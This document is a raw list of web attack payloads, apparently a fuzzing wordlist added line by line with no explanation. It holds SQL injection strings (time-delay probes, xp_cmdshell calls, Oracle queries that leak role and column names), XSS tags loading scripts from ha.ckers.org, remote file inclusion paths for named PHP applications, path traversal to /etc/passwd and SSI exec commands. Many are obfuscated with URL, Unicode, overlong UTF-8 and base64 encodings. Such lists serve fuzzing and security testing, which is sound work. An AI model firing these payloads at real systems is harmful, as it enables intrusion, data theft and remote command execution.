+%C0%AF%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%C0%FBFILE%C0%FF
+,/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/)%20waitfor%20delay%20'0:0:20'%20--
+/modules/forums/blocks/latest_posts.php?system[   path  ]=XXpathXX
+<!--#exec cmd="find / -name *.* -print" --><br/>
+%2F%70%6C%75%73%2E%70%68%70%3F%5F%70%61%67%65%73%5F%64%69%72%3D%58%58%70%61%74%68%58%58%3F
+onMove%00
+/..//..//..//..//..//..//..//{FILE} and '0having'='0having'
+'+If(benchmark(3000000,MD5(1)),nULL,nULL),nULL)%20--
+/index.php?page=XXpathXX%00
+<META%23sIafINj%0AHTTP-EQUIV="Link"%23stRqQhfZZJ%0AContent="<http://ha.ckers.org/xss.css>;%23tWFwnGeowH%0AREL=stylesheet">
+'%23fORTMTY%0Aor%23XGSYhZNW%0A%23mTQdWwuIaS%0A'unusual'%23oGUtyAl%0A=%23KtxwpgNDVVJO%0A'unusual'
+/skins/dEfAuLT.php?dir_inc=XXpathXX
+%C0%AF%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255c%C0%FBFILE%C0%FF
+select * from myfile;copy myfile to /tmp/test;%00
+/BetaBlockModules/LargestGroupsModule/LargestGroupsModule.php?path_prefix=XXpathXX%00
+%0A/usr/bin/id and '0having'='0having'
+<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>-- sp_password
+%C0%AFcontenido%C0%AFexternal%C0%AFfrontend%C0%AFnews%C0%AEphp%C0%BFcfg%C0%DBpath%C0%DF%C0%DBincludes%C0%DF%C0%BFXXpathXX
+%252F
+' /*!30985and 0=benchmark(3000000,MD5(1))%20*/--
+%+%|%+%D%i%r%+%c%:%\
+%252F%2574%2569%256B%2569%2577%2569%256B%2569%252F%2574%2569%256B%2569%252D%2567%2572%2561%2570%2568%255F%2566%256F%2572%256D%2575%256C%2561%252E%2570%2568%2570%253F%2577%253D%2531%2526%2568%253D%2531%2526%2573%253D%2531%2526%256D%2569%256E%253D%2531%2526%256D%2561%2578%253D%2532%2526%2566%255B%255D%253D%2578%252E%2574%2561%256E%252E%2570%2568%2570%2569%256E%2566%256F%2528%2529%2526%2574%253D%2570%256E%2567%2526%2574%2569%2574%256C%2565%253D%2558%2558%2570%2561%2574%2568%2558%2558
+%'%)%)%)%) %a%n%d %0%=%b%e%n%c%h%m%a%r%k%(%3%0%0%0%0%0%0%,%M%D%5%(%1%)%)%20%/%*
+%& %p%i%n%g %-%i %3%0 %1%2%7%.%0%.%0%.%1 %&
+%' %A%N%D %1%=%u%t%l%_%i%n%a%d%d%r%.%g%e%t%_%h%o%s%t%_%a%d%d%r%e%s%s%(%(%S%E%L%E%C%T %D%I%S%T%I%N%C%T%(%g%r%a%n%t%e%d%_%r%o%l%e%) %F%R%O%M %(%S%E%L%E%C%T %D%I%S%T%I%N%C%T%(%g%r%a%n%t%e%d%_%r%o%l%e%)%, %R%O%W%N%U%M %A%S %L%I%M%I%T %F%R%O%M %d%b%a%_%r%o%l%e%_%p%r%i%v%s %W%H%E%R%E %G%R%A%N%T%E%E%=%S%Y%S%.%L%O%G%I%N%U%S%E%R%) %W%H%E%R%E %L%I%M%I%T%=%2%)%) %A%N%D %'%i%'%=%'%i
+#+separate+fuzzfile+for+more+flexibiity
+'  or    3=3
+<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas<![CDATA[cript:alert(%00%27XSS%00%27);">
+")) /*!00000or 1=1 or (("1"="1*/
+<META%23nsJeuseomV%0AHTTP-EQUIV="Link"%23pfVQhXDunais%0AContent="<javascript:alert('XSS')>;%23EThVsY%0AREL=stylesheet">
+L2hlbHBlcmZ1bmN0aW9uLnBocD9pbmNsdWRlZGlyPVhYcGF0aFhY
+/administrator/components/com_jcs/views/list.user.sub.html.php?mosConfig_absolute_path=XXpathXX-- sp_password
+<SCRIPT--%0ASRC=http://ha.ckers.org/xss.js?<B>
+&lt;SCRIPT SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;jpg\"&gt;&lt;/SCRIPT&gt;%00
+%C0%AB%C0%AE%C0%AAselect%20if%C0%AAcount%C0%AA%C0%AA%C0%AB%C0%AB%C0%BF%C0%AF1%C0%AEbenchmark%C0%AA3000000%C0%AEMD5%C0%AA1%C0%AB%C0%AB%C0%AEbenchmark%C0%AA3000000%C0%AEMD5%C0%AA1%C0%AB%C0%AB%C0%AB%C0%AB%C0%AF%C0%AA
+%22%2C%28%73%65%6C%65%63%74%20%69%66%28%63%6F%75%6E%74%28%2A%29%21%3D%2D%31%2C%62%65%6E%63%68%6D%61%72%6B%28%33%30%30%30%30%30%30%2C%4D%44%35%28%31%29%29%2C%62%65%6E%63%68%6D%61%72%6B%28%33%30%30%30%30%30%30%2C%4D%44%35%28%31%29%29%29%29%2F%2A
+%2F%73%6D%69%6C%69%65%73%2E%70%68%70%3F%63%6F%6E%66%69%67%3D%58%58%70%61%74%68%58%58
+%u0078%u0027%u0020%u0041%u004E%u0044%u0020%u0075%u0073%u0065%u0072%u0069%u0064%u0020%u0049%u0053%u0020%u004E%u0055%u004C%u004C%u003B%u0020%u002D%u002D
+/script/common.inc.php?path_inc=XXpathXX%00
+%29%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2F%2A
+%&%l%t%;%I%F%R%A%M%E %S%R%C%=%\%"%j%a%v%a%s%c%r%i%p%t%&%#%0%5%8%;%a%l%e%r%t%(%'%X%S%S%'%)%;%\%"%&%g%t%;%&%l%t%;%/%I%F%R%A%M%E%&%g%t%;
+' /*!00000or 0=0 */--
+%22%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2D%2D
+/lms_path/modules/userpanel.php?CONFIG[directories][userpanel_dir]=XXpathXX
+%C0%ABif%C0%AAbenchmark%C0%AA3000000%C0%AEMD5%C0%AA1%C0%AB%C0%AB%C0%AENULL%C0%AENULL%C0%AB%C0%AENULL%C0%AENULL%C0%AENULL%C0%AB%20%23
+L29jcC0xMDMvaW5kZXgucGhwP3JlcV9wYXRoPVhYcGF0aFhY
+/index2.php?s=XXpathXX%00
+/_friendly/core/data/_load.php?friendly_path LIKE XXpathXX
+%M%O%V%E
+/index.php?phpbb_root_path=XXpathXX
+a%C0%BB%C0%AFusr%C0%AFbin%C0%AFid%C0%FE
+'+/*!if*/(benchmark(3000000,MD5(1)),/*!NULL*/,/*!NULL*/),/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/)%20/*
+%u0039%u0039%u0039%u0039%u0022%u002B%u0028%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u0063%u006F%u0075%u006E%u0074%u0028%u002A%u0029%u0020%u0066%u0072%u006F%u006D%u0020%u0049%u004E%u0046%u004F%u0052%u004D%u0041%u0054%u0049%u004F%u004E%u005F%u0053%u0043%u0048%u0045%u004D%u0041%u002E%u0074%u0061%u0062%u006C%u0065%u0073%u0020%u0061%u0073%u0020%u0073%u0079%u0073%u0031%u002C%u0049%u004E%u0046%u004F%u0052%u004D%u0041%u0054%u0049%u004F%u004E%u005F%u0053%u0043%u0048%u0045%u004D%u0041%u002E%u0074%u0061%u0062%u006C%u0065%u0073%u0020%u0061%u0073%u0020%u0073%u0079%u0073%u0032%u002C%u0049%u004E%u0046%u004F%u0052%u004D%u0041%u0054%u0049%u004F%u004E%u005F%u0053%u0043%u0048%u0045%u004D%u0041%u002E%u0074%u0061%u0062%u006C%u0065%u0073%u0020%u0061%u0073%u0020%u0073%u0079%u0073%u0033%u002C%u0049%u004E%u0046%u004F%u0052%u004D%u0041%u0054%u0049%u004F%u004E%u005F%u0053%u0043%u0048%u0045%u004D%u0041%u002E%u0074%u0061%u0062%u006C%u0065%u0073%u0020%u0061%u0073%u0020%u0073%u0079%u0073%u0034%u002C%u0049%u004E%u0046%u004F%u0052%u004D%u0041%u0054%u0049%u004F%u004E%u005F%u0053%u0043%u0048%u0045%u004D%u0041%u002E%u0074%u0061%u0062%u006C%u0065%u0073%u0020%u0061%u0073%u0020%u0073%u0079%u0073%u0035%u002C%u0049%u004E%u0046%u004F%u0052%u004D%u0041%u0054%u0049%u004F%u004E%u005F%u0053%u0043%u0048%u0045%u004D%u0041%u002E%u0074%u0061%u0062%u006C%u0065%u0073%u0020%u0061%u0073%u0020%u0073%u0079%u0073%u0036%u0029%u002B%u0022%u0039%u0039%u0039%u0039
+'%09AND%091=utl_inaddr.get_host_address((SELECT%0BDISTINCT(column_name)%0AFROM%0C(SELECT%0CDISTINCT(column_name),%09ROWNUM%0DAS%0ALIMIT%0DFROM%0Dall_tab_columns)%0CWHERE%0BLIMIT=4))%0AAND%0B'i'='i
+'%23kgYrCZ%0Aor%23WXtwLqaT%0A%23QnctIePr%0A4479=4479%23UqwEUsYouK%0A--
+%u0033%u0033%u0033%u0041%u004F%u0072%u0033%u0044%u0033%u0033%u003D%u0033%u0033
+' /*!30994or uname like '%*/
+/cgi-bin/test-cgi?/*%00
+'/*!0or 4479/*
+%2F%43%53%4C%48%32%5F%70%61%74%68%2F%74%78%74%2D%64%62%2D%61%70%69%2F%75%74%69%6C%2E%70%68%70%3F%41%50%49%5F%48%4F%4D%45%5F%44%49%52%3D%58%58%70%61%74%68%58%58%3F
+ZXhlYyhAcyk=
+' UNI/**/ON A/**/LL SE/**/LE/**/CT
+<SCRIPT>a=/XSS/
+(select 99999999 from pg_sleep(15))
+/classes/Auth/Yadis/XRDS.php?_ENV[asicms][pATh]=XXpAThXX
+%252F%2525%2575%2566%2566%2530%2565%2525%2575%2566%2566%2530%2565%2525%2575%2532%2532%2531%2536%257B%2546%2549%254C%2545%257D
+LyUyZSUyZSUyZiUyZSUyZSUyZiUyZSUyZSUyZiUyZSUyZSUyZiUyZSUyZSUyZiUyZSUyZSUyZntGSUxFfQ==
+%&%l%t%;%S%T%Y%L%E %t%y%p%e%=%\%"%t%e%x%t%/%c%s%s%\%"%&%g%t%;%B%O%D%Y%{%b%a%c%k%g%r%o%u%n%d%&%#%5%8%;%u%r%l%(%\%"%j%a%v%a%s%c%r%i%p%t%&%#%0%5%8%;%a%l%e%r%t%(%'%X%S%S%'%)%\%"%)%}%&%l%t%;%/%S%T%Y%L%E%&%g%t%;
+#/**/Eg:/**/XXpathXX/**/=>/**/http://www.example.com/hax.txt?
+$#lt;BASE HREF=\"javadom$##058;alert('XSS');//\"$#gt;
+%EF%BC%87))) and 0=benchmark(3000000,MD5(1))%20/*
+1%-1AOr%-1D1=1%00
+<OBJECT /*!00000TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>*/
+%C0%AFfiles%C0%AFfolder%C0%AFempty%C0%AEphp3%C0%BFBSX%C0%DFLIBDIR%C0%BFXXpathXX
+%252F%2542%2565%2574%2561%2542%256C%256F%2563%256B%254D%256F%2564%2575%256C%2565%2573%252F%2553%2565%2561%2572%2563%2568%2547%2572%256F%2575%2570%2573%254D%256F%2564%2575%256C%2565%252F%2553%2565%2561%2572%2563%2568%2547%2572%256F%2575%2570%2573%254D%256F%2564%2575%256C%2565%252E%2570%2568%2570%253F%2570%2561%2574%2568%255F%2570%2572%2565%2566%2569%2578%253D%2558%2558%2570%2561%2574%2568%2558%2558
+%&%#%0%0%0%0%6%0
+%C0%BB%C0%AAor%C0%AA%C0%AF%C0%AF%C0%AFqwer%C0%AF%C0%AF%C0%AF%C0%BF%C0%AF%C0%AF%C0%AFqwer%C0%AF%C0%AF%C0%AF
+/..\..\\..\{/etc/passwd}
+/Full_Release/include/body_comm.inc.jsp?content=$$path$$
+Jmx0O1NDUklQVC9TUkM9XCJodHRwJiM1ODsvL2hhJiM0Njtja2VycyYjNDY7b3JnL3hzcyYjNDY7anNcIiZndDsmbHQ7L1NDUklQVCZndDs=
+%2F%2E%2E%25%75%45%46%43%38%2E%2E%25%75%45%46%43%38%2E%2E%25%75%45%46%43%38%2E%2E%25%75%45%46%43%38%7B%46%49%4C%45%7D
+JzthbGVydChTdHJpbmcuZnJvbUNoYXJDb2RlKDg4LDgzLDgzKSkvL1wnO2FsZXJ0KFN0cmluZy5mcm9tQ2hhckNvZGUoODgsODMsODMpKS8vIjthbGVydChTdHJpbmcuZnJvbUNoYXJDb2RlKDg4LDgzLDgzKSkvL1wiO2FsZXJ0KFN0cmluZy5mcm9tQ2hhckNvZGUoODgsODMsODMpKS8vLS0+PC9TQ1JJUFQ+Ij4nPjxTQ1JJUFQ+YWxlcnQoU3RyaW5nLmZyb21DaGFyQ29kZSg4OCw4Myw4MykpPC9TQ1JJUFQ+
+/xt_counter.php?server_base_dir=XXpathXX
+/DFF_jsp_FrameworkAPI-latest/include/DFF_sku.func.jsp?DFF_config[dir_include]=$$path$$
+/function%23LIKXQqev%0A.php?adminfolder=XXpathXX
+/.\..\.\..\{/etc/passwd}
+"--VbNdUs%0Aor--oRGbsuqZRU%0A1=1--NmksKQPHvVaI%0Aor--mrWnVLa%0A"1"="1
+%2F%2E%2E%5c%2E%2E%5c%2E%2E%5c%2E%2E%5c%2E%2E%5c%2E%2E%5c%7B%46%49%4C%45%7D
+Jmx0O0JSIFNJWkU9XCIme2FsZXJ0KCdYU1MnKX1cIiZndDs=
+/oneadmin/config-bak.php?include_once=XXpathXX
+/forum/track.php?/*!path*/=XXpathXX
+&lt;BGSOUND--VZoATDVKmg%0ASRC=\"javascript&#058;alert('XSS');\"&gt;
+/zipndownload.php?PP_PATH=XXpathXX?%00
+%2527%2520%256F%2572%2520%2531%253D%2531
+JTA4eC4lMDh4LiUwOHguJTA4eC4lMDh4XG4=
+%/%f%l%u%s%h%c%m%d%/%I%n%c%l%u%d%e%/%e%d%i%t%o%r%/%r%i%c%h%_%f%i%l%e%s%/%c%l%a%s%s%.%r%i%c%h%.%p%h%p%?%c%l%a%s%s%_%p%a%t%h%=%X%X%p%a%t%h%X%X%?
+%u002F%u0063%u006C%u0061%u0073%u0073%u0065%u0073%u002F%u0074%u0065%u0063%u0068%u005F%u006F%u002E%u0070%u0068%u0070%u003F%u0061%u0062%u0073%u006F%u006C%u0075%u0074%u0065%u0070%u0061%u0074%u0068%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058
+"a""%03or%023=3--"
+%/%a%d%m%i%n%/%f%r%o%n%t%p%a%g%e%_%r%i%g%h%t%.%p%h%p%?%l%o%a%d%a%d%m%i%n%p%a%g%e%=%X%X%p%a%t%h%X%X
+%<%s%c%r%i%p%t%>%R%e%f%e%r%e%n%c%e%E%r%r%o%r%.%p%r%o%t%o%t%y%p%e%.%_%_%d%e%f%i%n%e%G%e%t%t%e%r%_%_%(%'%n%a%m%e%'%, %f%u%n%c%t%i%o%n%(%)%{%a%l%e%r%t%(%1%2%3%)%}%)%,%x%<%/%s%c%r%i%p%t%>
+/podcastgen1.0beta2/core/admin/editdel.php?p=admin&absoluteurl=XXpathXX%00
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url  value  =javascript:alert('XSS')></OBJECT>
+%2F%6C%69%62%72%61%72%69%65%73%2F%64%61%74%61%62%61%73%65%2E%70%68%70%3F%70%61%74%68%3D%58%58%70%61%74%68%58%58%3F%3F%3F
+%2568%2569%2520%256F%2572%2520%2561%253D%2561
+/s04.php?shopid LIKE XXpathXX?
+",NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+/..0x5c..0x5c..0x5c..0x5c..0x5c..0x5c{FILE} and '0having'='0having'
+/stats.php?vwar_root LIKE XXpathXX
+"))%0Cand%090=benchmark(3000000,MD5(1))%20--
+JTJCQUR3LXNjcmlwdCtBRDQtYWxlcnQoZG9jdW1lbnQubG9jYXRpb24pJTJCQUR3LS9zY3JpcHQlMkJBRDQt
+/%uff0e%uff0e%u2215%uff0e%uff0e%u2215%uff0e%uff0e%u2215{FILE}%00
+/plugins/spamx/DeleteComment.action.class.php?_CONF[path]=XXpathXX
+) /*!00000waitfor delay '0:0:20' *//*
+%2F%6C%69%6E%6B%61%64%6D%69%6E%2E%70%68%70%3F%70%61%67%65%3D%58%58%70%61%74%68%58%58%3F
+<!--#ex/**/ec cmd="/bin/echo '<SCRIPT SRC'"--><!--#ex/**/ec cmd="/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'"-->
+%u002F%u002E%u002F%u002F%u002E%u002E%u002F%u002F%u002E%u002F%u002F%u002E%u002E%u002F%u002F%u002E%u002F%u002F%u002E%u002E%u002F%u002F%u002E%u002F%u002F%u002E%u002E%u002F%u002F%u002E%u002F%u002F%u002E%u002E%u002F%u002F%u002E%u002F%u002F%u002E%u002E%u002F%u002F%u002E%u002F%u002F%u002E%u002E%u002F%u002F%u002E%u002F%u002F%u002E%u002E%u002F%u002F%u007B%u0046%u0049%u004C%u0045%u007D
+%EF%BC%87 or 3 > 1
+%2526%256C%2574%253B%2553%2554%2559%254C%2545%2526%2567%2574%253B%256C%2569%2520%257B%256C%2569%2573%2574%252D%2573%2574%2579%256C%2565%252D%2569%256D%2561%2567%2565%2526%2523%2535%2538%253B%2520%2575%2572%256C%2528%255C%2522%256A%2561%2576%2561%2573%2563%2572%2569%2570%2574%2526%2523%2530%2535%2538%253B%2561%256C%2565%2572%2574%2528%2527%2558%2553%2553%2527%2529%255C%2522%2529%253B%257D%2526%256C%2574%253B%252F%2553%2554%2559%254C%2545%2526%2567%2574%253B%2526%256C%2574%253B%2555%254C%2526%2567%2574%253B%2526%256C%2574%253B%254C%2549%2526%2567%2574%253B%2558%2553%2553
+%252F%2577%2561%2570%2563%2568%2561%2574%252F%2573%2572%2563%252F%2565%256E%2567%252E%2561%2564%2544%2569%2573%2570%2542%2579%2554%2579%2570%2565%254F%2570%2574%2569%256F%256E%2573%252E%2570%2568%2570%253F%2573%2579%2573%2546%2569%256C%2565%2544%2569%2572%253D%2558%2558%2570%2561%2574%2568%2558%2558
+/src/browser/resource/categories/resource_categories_view.php?CLASSES_ROOT=XXpathXX and '0having'='0having'
+))) /*!00000and 0=benchmark(3000000,MD5(1))%20*//*
+%EF%BC%87; exec (%EF%BC%87sel%EF%BC%87 + %EF%BC%87ect us%EF%BC%87 + %EF%BC%87er%EF%BC%87)
+/..%c1%9c{FILE} and '0having'='0having'
+%C0%AFfaq%C0%AEphp%C0%BFphpbb%C0%DFroot%C0%DFpath%C0%BFXXpathXX
+/modules/pms/index.php?module_path=XXpathXX???-- sp_password
+%/%a%u%t%h%.%h%e%a%d%e%r%.%i%n%c%.%p%h%p%?%d%a%_%p%a%t%h%=%X%X%p%a%t%h%X%X
+%2F%4F%70%65%6E%53%69%74%65%41%64%6D%69%6E%2F%73%63%72%69%70%74%73%2F%63%6C%61%73%73%65%73%2F%4C%6F%67%69%6E%4D%61%6E%61%67%65%72%2E%70%68%70%3F%70%61%74%68%3D%58%58%70%61%74%68%58%58%00
+/.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\{FILE}%00
+/modules/emails/index.php?full_path LIKE XXpathXX
+$#lt;?xml$##58;namespace prefix=\"t\" ns=\"urn$##58;schemas-microsoft-com$##58;time\"$#gt;
+/administrator/components/com_jcs/views/list.   user  .sub.html.php?mosConfig_absolute_path=XXpathXX
+LOL<style>*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;}</style> and '0having'='0having'
+&lt;SCRIPT%23rXbgQsHAJQ%0Aa=\"&gt;\"%23UUxifuvw%0ASRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+%2573%2565%256C%2565%2563%2574%2520%2563%2575%2572%2572%2565%256E%2574%255F%2573%2565%2574%2574%2569%256E%2567%2528%2527%2568%2562%2561%255F%2566%2569%256C%2565%2527%2529%253B
+/projects/weatimages/demo/index.php?ini[langpack]=XXpathXX
+JzsgZXhlYyBtYXN0ZXIuLnhwX2NtZHNoZWxsICdwaW5nIDEwLjEwLjEuMictLQ==
+/........................................................................../../../../../../{FILE}
+%"%)%) %o%r %p%g%_%s%l%e%e%p%(%_%_%T%I%M%E%_%_%)%-%-
+/inc/header.inc.php?ficStyle=XXpathXX-- sp_password
+<BODY BACKGROUND="javascript:alert('XSS')">%00
+" o/**/r sleep(__TIME__)#
+/index.php?/*!0exec=XXpathXX?
+//..//..//////{//etc//passwd}
+%u002F%u0061%u0064%u006D%u0069%u006E%u002F%u0063%u006C%u0061%u0073%u0073%u0065%u0073%u002F%u0070%u0065%u0061%u0072%u002F%u004F%u004C%u0045%u002F%u0050%u0050%u0053%u002F%u0052%u006F%u006F%u0074%u002E%u0070%u0068%u0070%u003F%u0068%u006F%u006D%u0065%u0064%u0069%u0072%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058
+/admin/admin_forgotten_password.php?root_folder_path=XXpathXX%00
+9999"   or  ( select    count(*)   from    INFORMATION_SCHEMA.tables  as   sys1,INFORMATION_SCHEMA.tables  as   sys2,INFORMATION_SCHEMA.tables  as   sys3,INFORMATION_SCHEMA.tables  as   sys4,INFORMATION_SCHEMA.tables  as   sys5,INFORMATION_SCHEMA.tables  as   sys6)=0   or  "0"="9999
+%u002F%u006D%u006F%u0064%u0075%u006C%u0065%u0073%u002F%u0073%u0065%u0061%u0072%u0063%u0068%u002F%u0069%u006E%u0064%u0065%u0078%u002E%u0070%u0068%u0070%u003F%u0066%u0075%u006C%u006C%u005F%u0070%u0061%u0074%u0068%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058
+declare @s varchar (8000) select @s LIKE 0x73656c65637420404076657273696f6e
+/main.php?include_path=XXpathXX?
+%/%c%o%m%p%o%n%e%n%t%s%/%c%o%m%_%a%r%t%l%i%n%k%s%/%a%r%t%l%i%n%k%s%.%d%i%s%p%n%e%w%.%p%h%p%?%m%o%s%C%o%n%f%i%g%_%a%b%s%o%l%u%t%e%_%p%a%t%h%=%X%X%p%a%t%h%X%X
+%/%i%n%d%e%x%.%p%h%p%?%c%o%n%f%i%g%[%r%o%o%t%_%o%r%d%n%e%r%]%=%X%X%p%a%t%h%X%X%?%c%m%d%=%i%d
+") or benchmark(10000000,MD5(1))#%00
+%/%c%o%n%t%r%o%l%l%e%r%s%/%S%e%t%u%p%C%o%n%t%r%o%l%l%e%r%.%p%h%p%?%b%a%s%e%D%i%r%=%X%X%p%a%t%h%X%X
+%2F%63%6F%6D%70%6F%6E%65%6E%74%73%2F%6D%69%6E%69%62%62%2F%69%6E%64%65%78%2E%70%68%70%3F%61%62%73%6F%6C%75%74%65%5F%70%61%74%68%3D%58%58%70%61%74%68%58%58%3F
+'));waitfor--%0Adelay--%0A'0:0:__TIME__'--
+/akocomments.php?mosConfig_absolute_path=XXpathXX-- sp_password
+&lt;IMG%23YpJYejzKN%0ALOWSRC=\"javascript&#058;alert('XSS')\"&gt;
+%a%)%;%i%d%;
+LyUyNWMwJTI1YWUlMjVjMCUyNWFlLyUyNWMwJTI1YWUlMjVjMCUyNWFlLyUyNWMwJTI1YWUlMjVjMCUyNWFlLyUyNWMwJTI1YWUlMjVjMCUyNWFlLyUyNWMwJTI1YWUlMjVjMCUyNWFlLyUyNWMwJTI1YWUlMjVjMCUyNWFlLyUyNWMwJTI1YWUlMjVjMCUyNWFlL3tGSUxFfQ==
+x' OR full_name LIKE '%Bob% and '0having'='0having'
+%/%.%.%c0%af%.%.%c0%af%.%.%c0%af%{%F%I%L%E%}
+%252F%2541%2543%2547%2556%256E%2565%2577%2573%252F%2568%2565%2561%2564%2565%2572%252E%2570%2568%2570%253F%2550%2561%2574%2568%254E%2565%2577%2573%253D%2558%2558%2570%2561%2574%2568%2558%2558
+//.\\\\..\\\\.\\\\..\\\\{//etc//inir.d//}
+Redirect 302 /a&#46;jpg http&#58;//victimsite&#46;com/admin&#46;asp&deleteuser
+L2luY2x1ZGVzL3hodG1sLnBocD9kX3Jvb3Q9WFhwYXRoWFg/
+\';%23cSAPDyUMFHK%0Adesc%23eMafvuQ%0Ausers;%23WNRhHoxjPt%0A--
+%27%2B%69%66%28%62%65%6E%63%68%6D%61%72%6B%28%33%30%30%30%30%30%30%2C%4D%44%35%28%31%29%29%2C%4E%55%4C%4C%2C%4E%55%4C%4C%29%2C%4E%55%4C%4C%29%20%23
+%3B%64%69%72
+",NulL,NulL,NulL)%20waitfor%20delay%20'0:0:20'%20/*
+51/**//**//**//**/or/**//**/1=1
+/mod/special/index.php?config[pathMod]=XXpathXX and '0having'='0having'
++If(benchmark(3000000,MD5(1)),nuLl,nuLl),nuLl,nuLl,nuLl)%20%23
+t'exec+master..xp_cmdshell+'nslookup www.google.com'--
+%2F%6C%61%6E%67%2F%6C%65%73%6C%61%6E%67%75%65%73%2E%70%68%70%3F%66%69%63%68%69%65%72%3D%58%58%70%61%74%68%58%58
+'/*!AND*/1=utl_inaddr.get_host_address((/*!SELECT*//*!DISTINCT*/(granted_role)/*!FROM*/(/*!SELECT*//*!DISTINCT*/(granted_role), ROWNUM/*!AS*//*!LIMIT*//*!FROM*/dba_role_privs/*!WHERE*/GRANTEE=SYS.LOGINUSER)/*!WHERE*//*!LIMIT*/=5))/*!AND*/'i'='i
+'--%0Aor--%0A'a'='a
+%u003B%u006E%u0065%u0074%u0073%u0074%u0061%u0074%u0020%u002D%u0061%u003B
+%C0%AFinclude%C0%AFheader%C0%AEphp%C0%BFcs%C0%DFbase%C0%DFpath%C0%BFXXpathXX%C0%BF
+L21vZHVsZXMvaG9tZS5tb2R1bGUucGhwP3JlcG1vZD1YWHBhdGhYWD8=
+/sources/join.php?FORM[url]=owned&CONFIG[captcha]=1&CONFIG[path]=XXpathXX
+/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/../../../../../../{FILE}-- sp_password
+/phplinks/includes/smarty.php?full_path_to_public_program=XXpathXX
+/admin/include/lib.module.php?mod_root LIKE XXpathXX
+"%0Bor%0Dsleep(__TIME__)#
+),/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/)%20waitfor%20delay%20'0:0:20'%20--
+%64%69%72%2B%63%3A%5C
+/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\..\..\..\..\{FILE}-- sp_password
+%252F%252E%255C%252E%252E%255C%252E%255C%252E%252E%255C%257B%2546%2549%254C%2545%257D
+/etc/httpd/logs/error_log and '0having'='0having'
+&lt;A%0DHREF=\"http&#58;//0x42&#46;0x0000066&#46;0x7&#46;0x93/\"&gt;XSS&lt;/A&gt;
+<BODY%23pyHltyfPxDG%0AONLOAD=alert('XSS')>
+/plugins/staticpages/functions.inc?_CONF[path%23JXlLzqahLBzM%0A]=XXpathXX
+/..%c0%5c{FILE}
+%252F%252E%252E%2525%2575%2532%2532%2531%2535%252E%252E%2525%2575%2532%2532%2531%2535%252E%252E%2525%2575%2532%2532%2531%2535%252E%252E%2525%2575%2532%2532%2531%2535%252E%252E%2525%2575%2532%2532%2531%2535%252E%252E%2525%2575%2532%2532%2531%2535%257B%2546%2549%254C%2545%257D
+/includes/functions.php?phpbb_root_path LIKE XXpathXX?
+/web/BetaBlockModules/LargestGroupsModule/LargestGroupsModule.php?path_prefix=XXpathXX%00
+%u002F%u0063%u006C%u0061%u0073%u0073%u0069%u0066%u0069%u0065%u0064%u005F%u0072%u0069%u0067%u0068%u0074%u002E%u0070%u0068%u0070%u003F%u006C%u0061%u006E%u0067%u0075%u0061%u0067%u0065%u005F%u0064%u0069%u0072%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058
+%2527%2520%2541%254E%2544%2520%2531%253D%2575%2574%256C%255F%2569%256E%2561%2564%2564%2572%252E%2567%2565%2574%255F%2568%256F%2573%2574%255F%2561%2564%2564%2572%2565%2573%2573%2528%2528%2553%2545%254C%2545%2543%2554%2520%2543%254F%2555%254E%2554%2528%2544%2549%2553%2554%2549%254E%2543%2554%2528%2547%2552%2541%254E%2554%2545%2544%255F%2552%254F%254C%2545%2529%2529%2520%2546%2552%254F%254D%2520%2544%2542%2541%255F%2552%254F%254C%2545%255F%2550%2552%2549%2556%2553%2520%2557%2548%2545%2552%2545%2520%2547%2552%2541%254E%2554%2545%2545%253D%2553%2559%2553%252E%254C%254F%2547%2549%254E%255F%2555%2553%2545%2552%2529%2529%2520%2541%254E%2544%2520%2527%2569%